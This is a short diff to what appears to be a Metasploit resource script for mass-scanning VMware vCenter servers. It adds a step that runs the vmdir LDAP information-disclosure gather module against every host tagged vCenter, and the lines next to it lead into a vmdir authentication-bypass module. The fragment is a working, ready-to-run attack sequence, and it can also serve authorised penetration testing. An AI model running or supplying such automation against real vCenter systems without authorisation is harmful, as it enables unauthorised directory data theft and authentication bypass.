@@ -251,6 +251,12 @@ hosts -S vCenter -R
 check
 sleep 5
 
+echo "VMware vCenter Server vmdir Information Disclosure"
+use auxiliary/gather/vmware_vcenter_vmdir_ldap
+hosts -S vCenter -R
+run
+sleep 5
+
 echo "VMware vCenter Server vmdir Authentication Bypass"
 use auxiliary/admin/ldap/vmware_vcenter_vmdir_auth_bypass
 hosts -S vCenter -R
